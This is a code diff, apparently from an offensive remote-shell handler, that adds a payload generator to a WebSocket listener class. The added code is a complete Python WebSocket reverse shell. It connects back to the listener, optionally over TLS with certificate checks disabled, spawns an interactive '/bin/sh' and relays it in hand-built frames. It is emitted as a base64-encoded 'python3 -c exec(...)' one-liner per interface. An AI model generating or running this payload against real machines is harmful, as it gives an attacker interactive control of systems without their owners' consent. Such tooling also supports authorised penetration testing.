@@ -2971,9 +2971,118 @@ class WSListener:
 			pass
 
 	def payloads(self, interface_filter=None):
-		# WS-specific payload templates land with commit 5; keep the Core
-		# path (options.payloads) happy in the meantime with an empty return.
-		return ""
+		pairs = Interfaces().pairs
+		name_of_ip = {ip: name for name, ip in pairs}
+		output = [str(paint(self).white_MAGENTA), ""]
+
+		ips = [self.host]
+		if self.host == '0.0.0.0':
+			ips = [ip for _, ip in pairs]
+
+		scheme = "wss" if self.tls_ctx else "ws"
+		use_tls = bool(self.tls_ctx)
+
+		interface_count = 0
+		for ip in ips:
+			iface_name = name_of_ip.get(ip)
+			if interface_filter and iface_name != interface_filter:
+				continue
+			iface_name = paint(iface_name).GREEN_black
+			interface_count += 1
+			output.extend((
+				f"➤  {iface_name} → {str(paint(scheme + '://' + ip).cyan)}:{str(paint(self.port).orange)}{str(paint(self.path).cyan)}",
+				"",
+				str(paint("Python WebSocket").UNDERLINE),
+			))
+			src = _ws_python_revshell_src(ip, self.port, self.path, ip, use_tls)
+			blob = base64.b64encode(src.encode()).decode()
+			output.append(f"python3 -c \"import base64;exec(base64.b64decode('{blob}'))\"")
+			output.append("")
+
+		output.append("─" * 80)
+		if not interface_count:
+			return ""
+		return "\n".join(output) + "\n"
+
+WS_PYTHON_REVSHELL_TEMPLATE = r"""
+import socket, ssl, base64, os, struct, subprocess, threading
+HOST = {host!r}
+PORT = {port}
+PATH = {path!r}
+HOSTHDR = {hosthdr!r}
+USE_TLS = {use_tls}
+s = socket.create_connection((HOST, PORT))
+if USE_TLS:
+	ctx = ssl.create_default_context()
+	ctx.check_hostname = False
+	ctx.verify_mode = ssl.CERT_NONE
+	s = ctx.wrap_socket(s, server_hostname=HOSTHDR)
+k = base64.b64encode(os.urandom(16)).decode()
+s.sendall(("GET " + PATH + " HTTP/1.1\r\nHost: " + HOSTHDR + "\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: " + k + "\r\nSec-WebSocket-Version: 13\r\n\r\n").encode())
+buf = b""
+while b"\r\n\r\n" not in buf:
+	c = s.recv(4096)
+	if not c: raise SystemExit(1)
+	buf += c
+leftover = [buf.split(b"\r\n\r\n", 1)[1]]
+sh = subprocess.Popen(["/bin/sh", "-i"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=0)
+def rn(n):
+	d = b""
+	while len(d) < n:
+		if leftover[0]:
+			t = leftover[0][:n - len(d)]
+			d += t
+			leftover[0] = leftover[0][len(t):]
+			continue
+		c = s.recv(n - len(d))
+		if not c: raise SystemExit(0)
+		d += c
+	return d
+def rf():
+	h = rn(2)
+	b1, b2 = h[0], h[1]
+	m = b2 & 0x80
+	ln = b2 & 0x7f
+	if ln == 126: ln = struct.unpack("!H", rn(2))[0]
+	elif ln == 127: ln = struct.unpack("!Q", rn(8))[0]
+	mk = rn(4) if m else b""
+	p = rn(ln) if ln else b""
+	if m: p = bytes(b ^ mk[i & 3] for i, b in enumerate(p))
+	return b1 & 0x0f, p
+def sf(data, op=2):
+	b1 = 0x80 | op
+	mk = os.urandom(4)
+	n = len(data)
+	if n < 126: h = struct.pack("!BB", b1, 0x80 | n)
+	elif n < 65536: h = struct.pack("!BBH", b1, 0x80 | 126, n)
+	else: h = struct.pack("!BBQ", b1, 0x80 | 127, n)
+	mp = bytes(b ^ mk[i & 3] for i, b in enumerate(data))
+	s.sendall(h + mk + mp)
+def po():
+	while True:
+		c = sh.stdout.read(4096)
+		if not c: break
+		try: sf(c)
+		except Exception: break
+threading.Thread(target=po, daemon=True).start()
+while True:
+	try:
+		op, p = rf()
+	except SystemExit: break
+	except Exception: break
+	if op == 8: break
+	if p:
+		try:
+			sh.stdin.write(p)
+			sh.stdin.flush()
+		except Exception: break
+""".lstrip()
+
+def _ws_python_revshell_src(host, port, path, hosthdr, use_tls):
+	return WS_PYTHON_REVSHELL_TEMPLATE.format(
+		host=host, port=port, path=path, hosthdr=hosthdr,
+		use_tls=repr(bool(use_tls)),
+	)
 
 class Session:
 
